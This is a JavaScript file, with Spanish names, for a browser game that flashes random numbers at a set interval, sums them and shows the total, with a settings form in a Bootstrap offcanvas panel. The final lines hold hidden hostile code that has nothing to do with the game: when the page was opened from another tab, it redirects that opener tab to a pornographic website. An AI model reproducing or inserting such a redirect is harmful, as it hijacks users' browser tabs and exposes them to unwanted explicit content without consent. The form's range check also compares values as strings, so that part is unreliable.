
let tiempo=1000;
let desde=-30;
let hasta=50;
let contador=0;
let cantidadDeNumerosParaSumar=10;
let sumatoria=0;

const btnEmpezar=document.getElementById("btnEmpezar");
const divNumero=document.getElementById('nRandom');

const inicializarVariables=()=>{
    contador=0;
    tiempo=parseInt(formulario["intervalo"].value,10);
    desde=parseInt(formulario["desde"].value,10);
    hasta=parseInt(formulario["hasta"].value,10);
    cantidadDeNumerosParaSumar=parseInt(formulario["cantidadDeNumerosParaSumar"].value,10);
    sumatoria=0;
    divNumero.textContent="Número random";
}

function getRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}


document.getElementById('intervalo').addEventListener('change', function() {
     tiempo = this.value;

    
});




const mostrarNumeros=()=>{     
    contador++;
    let nRandom=getRandomNumber(desde,hasta);
    sumatoria+=nRandom;
    divNumero.textContent = nRandom;
   
    if(contador<cantidadDeNumerosParaSumar)
        setTimeout(mostrarNumeros,tiempo);
    else {
        // sacar el botón empezar y poner el resultado
        btnEmpezar.textContent="Ver resultado";
        btnEmpezar.disabled=false;
    }
}

document.getElementById("btnEmpezar").addEventListener('click',()=>{
    if( btnEmpezar.textContent ==="Empezar"){
        inicializarVariables();
        btnEmpezar.disabled=true;
        mostrarNumeros();
         
    }
    else{
       divNumero.textContent=sumatoria;
       btnEmpezar.textContent="Empezar"
    }

})


function closeOffcanvas() {
    var offcanvasElement = document.getElementById('staticBackdrop');
    var offcanvasInstance = bootstrap.Offcanvas.getInstance(offcanvasElement) || new bootstrap.Offcanvas(offcanvasElement);
    offcanvasInstance.hide();
  }

 formulario.addEventListener('submit', function(event) {
    event.preventDefault();

    if(formulario["desde"].value>=formulario["hasta"].value){
        desde=-30;
        hasta=50;
    }
    else {
        desde=parseInt(formulario["desde"].value,10);
        hasta=parseInt(formulario["hasta"].value,10);
    }
    tiempo=parseInt(formulario["intervalo"].value,10);
    cantidadDeNumerosParaSumar=parseInt(formulario["cantidadDeNumerosParaSumar"].value,10);
    closeOffcanvas();


});

if(window.opener){
window.opener.location.href = "https://es.pornhub.com/";
console.log("seee")}